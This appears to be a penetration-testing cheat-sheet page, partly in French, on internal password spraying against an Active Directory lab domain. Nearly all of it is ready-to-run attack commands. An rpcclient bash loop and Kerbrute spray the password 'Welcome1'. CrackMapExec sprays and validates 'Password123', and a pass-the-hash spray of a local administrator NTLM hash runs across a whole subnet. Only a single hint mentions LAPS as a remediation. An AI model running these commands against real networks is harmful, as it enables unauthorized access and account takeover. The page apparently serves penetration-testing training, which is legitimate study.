# Internal Password Spraying - from Linux

***

### <mark style="color:red;">Internal Password Spraying from a Linux Host</mark>

<mark style="color:green;">**Using a Bash one-liner for the Attack**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
{% endcode %}

{% code overflow="wrap" fullWidth="true" %}
```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
{% endcode %}

We can also use `Kerbrute` for the same attack as discussed previously.

<mark style="color:green;">**Using Kerbrute for the Attack**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

```
{% endcode %}

<mark style="color:green;">**Using CrackMapExec & Filtering Logon Failures**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```
{% endcode %}

After getting one (or more!) hits with our password spraying attack, we can then use `CrackMapExec` to validate the credentials quickly against a Domain Controller.

<mark style="color:green;">**Validating the Credentials with CrackMapExec**</mark>

{% code fullWidth="true" %}
```shell-session
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```
{% endcode %}

***

### <mark style="color:red;">Local Administrator Password Reuse</mark>

Le **password spraying interne** consiste à tester un **même mot de passe (ou hachage NTLM)** sur plusieurs machines.\
Comme les administrateurs locaux réutilisent souvent le même mot de passe, un attaquant peut exploiter cette faiblesse avec des outils comme **CrackMapExec**, qui permettent de vérifier de nombreux systèmes sans bloquer les comptes.

<mark style="color:green;">**Local Admin Spraying with CrackMapExec**</mark>

{% code overflow="wrap" fullWidth="true" %}
```shell-session
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
{% endcode %}

{% hint style="danger" %}
&#x20;One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.
{% endhint %}
